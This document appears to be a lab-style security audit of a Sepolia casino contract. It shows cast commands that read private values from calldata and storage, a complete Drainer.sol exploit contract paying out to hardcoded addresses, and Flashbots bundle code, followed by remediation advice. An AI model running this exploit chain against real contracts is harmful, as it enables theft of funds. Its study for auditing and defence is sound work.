# Security Audit — FairCasino

**Target :** `0xed5415679D46415f6f9a82677F8F4E9ed9D1302b` (Sepolia)  
**Oracle :** Chainlink BTC/USD `0x1b44F3514812d835EB1BDB0acB33d3fA3351Ee43`  
**Scope :** Smart contract audit — vulnerability analysis, exploitation path, and remediation

---

## 1. Overview

`FairCasino` is an on-chain guessing game where players submit a guess against a deterministic winning number derived from a Chainlink oracle price, a private salt, and the current round. A proof-of-work check gates each play attempt.

The contract is critically vulnerable: all parameters required to compute the winning number are recoverable from public on-chain data, the PoW is trivially minable off-chain, and transactions sent via the public mempool are subject to MEV frontrunning.

---

## 2. Game Mechanism

```
play(guess, round, nonce) [0.01 ETH]
├─ PoW : keccak256(msg.sender, nonce, guess, round)[-2:] == 0xbeef
├─ winningNumber = keccak256(secretTarget ^ btcPrice, gameSalt, round)
└─ guess == winningNumber → payout min(jackpotReserve / 2, 0.1 ETH)
```

Three inputs are required to win: `secretTarget`, `gameSalt`, and the BTC/USD price at the time of block inclusion.

---

## 3. Vulnerabilities

### 3.1 `secretTarget` — Two independent read paths

`secretTarget` is declared `private` in `FairCasino`. In Solidity, `private` only restricts in-contract access — it does not prevent external reads. Two independent paths expose it.

**Path 1 — Constructor calldata.** `secretTarget` is passed as the first argument to the constructor (`_target`). Constructor arguments are appended to the deployment transaction's input data and are permanently recorded on-chain. Any block explorer exposes them directly.

**Path 2 — Storage slot 5.** As a state variable, `secretTarget` also lives in the contract's persistent storage. The non-obvious aspect is the slot number.

`FairCasino` imports a local `Context.sol` that is deliberately not the real OpenZeppelin `Context`. The real OpenZeppelin `Context` has no state variables at all — only virtual functions — and would cause no slot shift. This project's `Context` is a custom contract with four state variables (`_trustedForwarder`, `_relayId`, `_executionCluster`, `_gasRelayContext`) occupying slots 0–3. `FairCasino` then declares `house` at slot 4. `secretTarget` — the second variable in `FairCasino` — therefore lands at **slot 5**.

The trap is that the import name looks like the standard OpenZeppelin `Context`. Anyone who checks the real OpenZeppelin repository will find a `Context` with no state variables — which would mean no slot offset. That conclusion would be correct for the real library. Here, it is wrong, because this local `Context.sol` is a lookalike with hidden state variables.

```bash
# Path 1 — decode the deployment transaction input
cast tx <deploy_tx_hash> --rpc-url $RPC_URL
cast calldata-decode "constructor(uint256,address,uint256)" <input_data>

# Path 2 — direct storage read at the correct slot
cast storage 0xed5415679D46415f6f9a82677F8F4E9ed9D1302b 5 --rpc-url $RPC_URL
# or inspect the full layout
forge inspect FairCasino storage
```

### 3.2 `gameSalt` — Immutable variable, only exposed via constructor calldata

`gameSalt` is declared `private immutable`. Immutable variables are not stored in EVM storage slots — they are inlined into the contract bytecode at deployment time. `eth_getStorageAt` always returns zero for an immutable, regardless of slot.

The only read path is the same as for `secretTarget`: the constructor calldata of the deployment transaction. Both values were passed as arguments to the same constructor call and are permanently readable on-chain.

```bash
cast tx <deploy_tx_hash> --rpc-url $RPC_URL
cast calldata-decode "constructor(uint256,address,uint256)" <input_data>
```

The key distinction: `secretTarget` is recoverable via two independent methods (calldata and storage slot); `gameSalt` is only recoverable via calldata.

### 3.3 `winningNumber` — Fully deterministic and pre-computable

Once `secretTarget` and `gameSalt` are known, and given that Chainlink updates the BTC/USD feed every ~30 seconds or on a ±0.5% price deviation, `winningNumber` can be computed off-chain before submitting the transaction:

```python
winning_number = keccak256(
    abi.encodePacked(secret_target ^ btc_price, game_salt, current_round)
)
```

The attacker reads the current oracle price, computes the winning number, and submits it in the same block before a price update occurs.

### 3.4 PoW — Off-chain minable in milliseconds

The proof-of-work check `keccak256(msg.sender, nonce, guess, round)[-2:] == 0xbeef` requires an expected ~65 000 iterations on average. This is trivially brute-forced off-chain in under a second.

A critical detail: `msg.sender` in the PoW hash is the **direct caller of `play()`**. If the attack routes through an intermediary contract (`Drainer`), `msg.sender` is the Drainer's address — not the EOA. The nonce must be mined for the correct sender address.

### 3.5 MEV frontrunning — Public mempool exposure

Any transaction submitted via a standard RPC endpoint enters the public mempool. All parameters (`guess`, `round`, `nonce`) are visible in the pending transaction's calldata. A MEV bot monitoring the mempool can extract these values, submit `casino.play(guess, round, nonce)` with a higher gas price, and land in the block first. The original transaction then arrives with a stale round and reverts.

This attack is independent of how well the winning number was computed — even a perfectly crafted transaction is vulnerable if broadcast publicly.

---

## 4. Exploitation

### 4.1 Architecture — hybrid off-chain / on-chain approach

The optimal exploit combines off-chain computation with on-chain atomicity:

**Off-chain (Python / Node.js):**
1. Read `secretTarget` from storage slot 5
2. Decode `gameSalt` from the deployment transaction's constructor calldata
3. Fetch the live BTC/USD price from the Chainlink oracle
4. Compute `winningNumber`
5. Mine the PoW nonce for the Drainer contract address

**On-chain (`Drainer.sol`):**
- Receives pre-computed `(_guess, _round, _nonce)`
- Calls `casino.play{value: 0.01 ether}(...)` and `distribute()` atomically in a single transaction

Atomicity is essential: if `distribute()` were a separate transaction, a third party could drain the Drainer contract between the two calls.

### 4.2 Reference implementation — Drainer.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {IDrainer} from "./IDrainer.sol";

interface IFairCasino {
    function play(uint256 guess, uint256 round, uint256 nonce) external payable;
}

contract Drainer is IDrainer {
    address constant CASINO = 0xed5415679D46415f6f9a82677F8F4E9ed9D1302b;

    address payable constant LT1 = payable(0x1acB0745a139C814B33DA5cdDe2d438d9c35060E);
    address payable constant LT2 = payable(0xbE99BCD0D8FdE76246eaE82AD5eF4A56b42c6B7d);
    address payable constant LT3 = payable(0xA791D68A0E2255083faF8A219b9002d613Cf0637);

    function attack(uint256 _guess, uint256 _round, uint256 _nonce) external payable override {
        IFairCasino(CASINO).play{value: 0.01 ether}(_guess, _round, _nonce);
        distribute();
    }

    function distribute() public override {
        uint256 bal = address(this).balance;
        require(bal > 0, "nothing to distribute");
        uint256 s1 = (bal * 50) / 100;
        uint256 s2 = (bal * 30) / 100;
        (bool ok1,) = LT1.call{value: s1}("");
        (bool ok2,) = LT2.call{value: s2}("");
        (bool ok3,) = LT3.call{value: bal - s1 - s2}("");
        require(ok1 && ok2 && ok3, "distribution failed");
    }

    receive() external payable {}
}
```

Notable implementation details:
- `.call` over `.transfer` — avoids the 2300 gas stipend limit hitting reverting recipients
- Residual calculation for LT3 — eliminates wei dust from integer division
- `receive()` — required to accept the ETH payout from `casino.play()`

### 4.3 MEV bypass — Flashbots Protect

Submitting via Flashbots Protect routes the transaction directly to block builders through a private relay, bypassing the public mempool entirely. A MEV bot watching `eth_subscribe("newPendingTransactions")` sees nothing.

```javascript
import { FlashbotsBundleProvider } from "@flashbots/ethers-provider-bundle";

const flashbotsProvider = await FlashbotsBundleProvider.create(
    provider,
    wallet,
    "https://relay-sepolia.flashbots.net",
    "sepolia"
);

const bundle = [{
    transaction: {
        to: drainerAddress,
        value: ethers.parseEther("0.01"),
        data: drainer.interface.encodeFunctionData("attack", [guess, round, nonce]),
        gasLimit: 300_000,
    },
    signer: wallet,
}];

await flashbotsProvider.sendBundle(bundle, await provider.getBlockNumber() + 1);
```

---

## 5. Remediation

### 5.1 Verifiable on-chain randomness — Chainlink VRF v2.5

Replace the deterministic `winningNumber` derivation with a Chainlink VRF request. The random value is generated off-chain with a cryptographic proof and delivered in a callback — it cannot be known before the callback lands, making pre-computation impossible.

### 5.2 Commit-Reveal scheme

Introduce a two-phase flow to decouple commitment from resolution:
- **Commit phase**: player submits `keccak256(guess, playerSecret)` + 0.01 ETH
- **Reveal phase**: in a subsequent block, player reveals `(guess, playerSecret)`; the contract verifies the commitment and resolves the round

This prevents anyone from computing the winning number before the reveal transaction is included.

### 5.3 Time-Weighted Average Price (TWAP) oracle

The spot Chainlink price is observable in real time and can be manipulated within a short window via flash loans. Using a TWAP over several blocks significantly increases the cost and complexity of price prediction.

### 5.4 Per-round play restriction

Disallowing multiple `play()` calls within the same block for a given round eliminates same-block frontrunning vectors.

---

## 6. References

- [Solidity storage layout — inheritance](https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html)
- [Solidity immutable variables](https://docs.soliditylang.org/en/latest/contracts.html#immutable)
- [Flashbots Protect documentation](https://docs.flashbots.net/flashbots-protect/overview)
- [Chainlink VRF v2.5](https://docs.chain.link/vrf)
- [Commitment scheme](https://en.wikipedia.org/wiki/Commitment_scheme)
- [Foundry cast — on-chain inspection](https://www.getfoundry.sh/cast)
